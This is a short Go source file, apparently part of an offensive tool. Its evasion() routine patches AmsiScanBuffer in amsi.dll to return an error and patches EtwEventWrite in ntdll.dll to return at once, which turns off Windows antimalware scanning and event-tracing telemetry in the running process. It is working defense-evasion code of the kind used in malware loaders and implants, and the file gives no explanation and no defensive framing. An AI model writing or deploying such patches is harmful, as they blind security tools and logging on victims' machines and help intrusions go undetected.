package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

func evasion() {
	patchAMSI()
	patchETW()
}

func patchAMSI() {
	amsiDLL := windows.NewLazySystemDLL("amsi.dll")
	if err := amsiDLL.Load(); err != nil {
		return
	}
	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
	addr := amsiScanBuffer.Addr()
	patch := []byte{0xB8, 0x57, 0x00, 0x00, 0x07, 0xC3}
	var oldPerms uint32
	windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldPerms)
	patchSlice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(patchSlice, patch)
	windows.VirtualProtect(addr, uintptr(len(patch)), oldPerms, &oldPerms)
}

func patchETW() {
	ntdllDLL := windows.NewLazySystemDLL("ntdll.dll")
	etwEventWrite := ntdllDLL.NewProc("EtwEventWrite")
	addr := etwEventWrite.Addr()
	patch := []byte{0xC3}
	var oldPerms uint32
	windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldPerms)
	patchSlice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(patchSlice, patch)
	windows.VirtualProtect(addr, uintptr(len(patch)), oldPerms, &oldPerms)
}
